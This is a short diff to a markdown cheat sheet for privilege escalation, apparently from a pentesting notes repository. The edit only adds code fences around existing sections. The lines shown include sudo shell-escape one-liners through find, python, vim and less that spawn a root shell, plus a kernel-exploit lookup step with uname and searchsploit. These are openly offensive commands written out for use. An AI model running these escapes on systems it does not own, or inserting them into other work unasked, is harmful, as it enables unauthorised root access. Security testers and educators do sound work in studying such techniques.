@@ -84,16 +84,20 @@ python3 privesc_checklist.py --all
 ```
 ## SUDO EXPLOITS
 
+```
 sudo find . -exec /bin/sh \; -quit
 sudo python -c 'import pty; pty.spawn("/bin/bash")'
 sudo vim -c ':!/bin/sh'
 sudo less /etc/profile
 !/bin/bash
+```
 
 ## KERNEL EXPLOITS
 
+```
 uname -a
 searchsploit linux kernel VERSION
+```
 
 ## PRIVESC WINDOWS
 ```
